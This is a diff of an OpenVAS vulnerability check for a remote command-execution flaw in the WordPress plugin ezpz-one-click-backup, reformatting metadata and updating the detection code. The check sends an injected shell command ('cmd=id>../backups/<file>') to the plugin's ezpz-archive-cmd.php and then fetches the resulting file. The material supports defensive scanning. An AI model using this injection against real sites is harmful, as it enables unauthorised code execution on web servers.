@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_ezpz_one_click_backup_cmd_exec.nasl 6756 2017-07-18 13:31:14Z cfischer $
+# $Id: gb_wordpress_ezpz_one_click_backup_cmd_exec.nasl 11867 2018-10-12 10:48:11Z cfischer $
 #
 # WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability
 #
@@ -27,67 +27,58 @@
 
 CPE = "cpe:/a:wordpress:wordpress";
 
-tag_insight = "Input passed via the 'cmd' parameter in ezpz-archive-cmd.php
-is not properly sanitized.";
-
-tag_impact = "An attacker can exploit this issue to execute arbitrary code
-within the context of the web server.";
-
-tag_affected = "12.03.10 and some earlier versions";
-
-tag_summary = "The ezpz-one-click-backup plugin for WordPress is prone to remote code
-execution vulnerability because it fails to properly validate user supplied input.";
-
-tag_solution = "Remove this plugin from your WordPress installation.";
-tag_vuldetect = "Send a special crafted HTTP GET request and check the response.";
-
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105029");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 6756 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.105029");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_version("$Revision: 11867 $");
 
- script_name("WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability");
+  script_name("WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability");
 
 
- script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2014/05/01/11");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
- script_tag(name:"creation_date", value:"2014-05-21 11:38:56 +0200 (Wed, 21 May 2014)");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
- script_dependencies("secpod_wordpress_detect_900182.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("wordpress/installed");
+  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2014/05/01/11");
 
- script_tag(name : "impact" , value : tag_impact);
- script_tag(name : "vuldetect" , value : tag_vuldetect);
- script_tag(name : "insight" , value : tag_insight);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_tag(name : "affected" , value : tag_affected);
+  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2014-05-21 11:38:56 +0200 (Wed, 21 May 2014)");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
+  script_dependencies("secpod_wordpress_detect_900182.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("wordpress/installed");
 
- exit(0);
+  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code
+within the context of the web server.");
+  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
+  script_tag(name:"insight", value:"Input passed via the 'cmd' parameter in ezpz-archive-cmd.php
+is not properly sanitized.");
+  script_tag(name:"solution", value:"Remove this plugin from your WordPress installation.");
+  script_tag(name:"solution_type", value:"Mitigation");
+  script_tag(name:"summary", value:"The ezpz-one-click-backup plugin for WordPress is prone to remote code
+execution vulnerability because it fails to properly validate user supplied input.");
+  script_tag(name:"affected", value:"12.03.10 and some earlier versions");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
-include("http_keepalive.inc");
-include("global_settings.inc");
+include("misc_func.inc");
+
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+vtstring = get_vt_string( lowercase:TRUE );
 
-file = 'openvas_' + rand() + '.txt';
+file = vtstring + '_' + rand() + '.txt';
 url = dir + '/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=id>../backups/' + file;
 
 req = http_get( item:url, port:port );
 buf = http_send_recv( port:port, data:req );
 
-if( buf !~ "HTTP/1\.. 200" ) exit( 99 );
+if( buf !~ "^HTTP/1\.[01] 200" ) exit( 99 );
 
 url = dir + '/wp-content/plugins/ezpz-one-click-backup/backups/' + file;
 req = http_get( item:url, port:port );
